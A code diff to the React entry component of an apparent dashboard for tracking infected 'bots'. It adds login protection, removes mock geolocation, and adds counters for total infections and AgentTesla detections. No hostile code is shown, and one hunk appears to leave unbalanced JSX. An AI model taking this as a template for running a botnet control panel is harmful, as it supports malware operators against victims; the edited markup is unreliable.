@@ -1,35 +1,26 @@
 /**
- * Main App Component - Entry Point
+ * Main App Component - Entry Point with Authentication
  * 
- * Orchestrates the dashboard layout and primary views.
+ * Orchestrates the dashboard layout and primary views with login protection.
  */
 
 import React, { useState } from 'react';
 import DashboardLayout from '@/components/DashboardLayout';
 import BotDataGrid from '@/components/BotDataGrid';
 import LiveTerminal from '@/components/LiveTerminal';
-import InfectionMap from '@/components/InfectionMap';
 import HexViewer from '@/components/HexViewer';
+import { AuthProvider, useAuth, LoginPage } from '@/components/Auth';
 import { useQuery } from '@tanstack/react-query';
 import { botsApi, statsApi } from '@/lib/api';
-import type { Bot, BotWithGeo } from '@/types';
+import type { Bot } from '@/types';
 
-const App: React.FC = () => {
+const DashboardContent: React.FC = () => {
   const [selectedBot, setSelectedBot] = useState<Bot | null>(null);
 
-  // Fetch bots with mock geolocation (in production, backend would provide this)
+  // Fetch bots
   const { data: bots = [] } = useQuery({
     queryKey: ['bots'],
-    queryFn: async () => {
-      const fetchedBots = await botsApi.list({ limit: 100 });
-      // Mock geolocation data (in production, enrich from GeoIP database)
-      return fetchedBots.map((bot): BotWithGeo => ({
-        ...bot,
-        latitude: Math.random() * 180 - 90,
-        longitude: Math.random() * 360 - 180,
-        country: 'Unknown',
-      }));
-    },
+    queryFn: () => botsApi.list({ limit: 100 }),
     refetchInterval: 10000,
   });
 
@@ -55,11 +46,6 @@ const App: React.FC = () => {
           <div className="space-y-4">
             <div className="ops-card">
               <div className="ops-card-header">
-                <span>System Status</span>
-              </div>
-              <div className="space-y-3 mt-4">
-                <div className="flex items-center justify-between">
-                  <span className="text-sm text-gray-400">Active Handlers</span>
                   <span className="text-lg font-bold text-ops-green">1</span>
                 </div>
                 <div className="flex items-center justify-between">
@@ -96,6 +82,37 @@ const App: React.FC = () => {
         {/* Middle Row: Bot Grid */}
         <div>
           <BotDataGrid onBotSelect={setSelectedBot} />
+
+          {/* Additional Stats Panel */}
+          <div className="md:col-span-2">
+            <div className="ops-card h-full">
+              <div className="ops-card-header">
+                <span>System Overview</span>
+              </div>
+              <div className="grid grid-cols-2 gap-6 mt-6">
+                <div className="text-center p-6 bg-ops-black rounded border border-ops-border">
+                  <div className="text-4xl font-bold text-ops-green mb-2">{bots.length}</div>
+                  <div className="text-sm text-gray-400">Total Infections</div>
+                </div>
+                <div className="text-center p-6 bg-ops-black rounded border border-ops-border">
+                  <div className="text-4xl font-bold text-ops-red mb-2">
+                    {bots.filter(b => b.protocol === 'AgentTesla').length}
+                  </div>
+                  <div className="text-sm text-gray-400">AgentTesla Detections</div>
+                </div>
+                <div className="text-center p-6 bg-ops-black rounded border border-ops-border">
+                  <div className="text-4xl font-bold text-ops-cyan mb-2">
+                    {new Set(bots.map(b => b.ip_address)).size}
+                  </div>
+                  <div className="text-sm text-gray-400">Unique IPs</div>
+                </div>
+                <div className="text-center p-6 bg-ops-black rounded border border-ops-border">
+                  <div className="text-4xl font-bold text-ops-yellow mb-2">1</div>
+                  <div className="text-sm text-gray-400">Active Protocols</div>
+                </div>
+              </div>
+            </div>
+          </div>
         </div>
 
         {/* Bottom Row: Hex Viewer & Terminal */}
@@ -159,4 +176,22 @@ const App: React.FC = () => {
   );
 };
 
-export default App;
+// Main App with Authentication
+const App: React.FC = () => {
+  const { isAuthenticated } = useAuth();
+
+  if (!isAuthenticated) {
+    return <LoginPage />;
+  }
+
+  return <DashboardContent />;
+};
+
+// Wrap with Auth Provider
+const AppWithAuth: React.FC = () => (
+  <AuthProvider>
+    <App />
+  </AuthProvider>
+);
+
+export default AppWithAuth;
